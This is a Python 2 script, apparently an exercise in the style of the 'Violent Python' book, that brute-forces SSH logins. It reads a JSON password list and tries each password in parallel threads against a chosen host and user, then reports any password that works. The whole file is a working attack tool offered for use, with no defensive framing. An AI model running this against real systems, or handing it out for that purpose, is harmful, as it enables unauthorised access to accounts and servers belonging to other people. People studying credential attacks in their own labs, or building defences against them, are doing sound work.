from pexpect import pxssh
import optparse
import time
import json
from threading import *

# global variables definitions
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
verbose = False

# define verbose messaging function
def print_verbose(message):
    if verbose is True:
        print(message)
    else:
        pass

# define connection thread object for trying a password on tagert SSH host
def connect(host, user, password, release):

    # bring global variables into scope for use as sephamores amung all threads
    global Found
    global Fails

    # attempt connection to ssh server w/ provided test password
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
        Found = True
    
    # handle connection errors and re-attempts for blocking issues
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    
    # release connection lock and syncronsize before closing
    finally:
        if release: connection_lock.release()


def main():
    # define args, help msgs, and recepiant variables for user inputs
    parser = optparse.OptionParser('usage%prog ' + '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('-v', dest='verbose', action="store_true", default=False, help='enable verbose')
    
    # read in user supplied args
    (options, args) = parser.parse_args()

    # confingure execution verbosity level
    global verbose
    if options.verbose:
        verbose = True
    
    # extract target, password file, and user from args
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    # update user on status
    print_verbose("Attack Started: Host - " + host + " User - " + user + " File - " + passwdFile)

    # verify required args exist
    if host == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)
    
    # load password list
    passwords = json.loads(open(passwdFile).read())

    # start multi threaded attack agianst target host
    for password in passwords:
        if Found:
            print "[*] Exiting: Password Found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting: Too Many Socket Timeouts"
            exit(0)
        
        connection_lock.acquire()
        
        print "[-] Testing: "+ password
        
        # create and start thread to try password
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()

# verify standalone operation and execute main if needed
if __name__ == '__main__':
    main()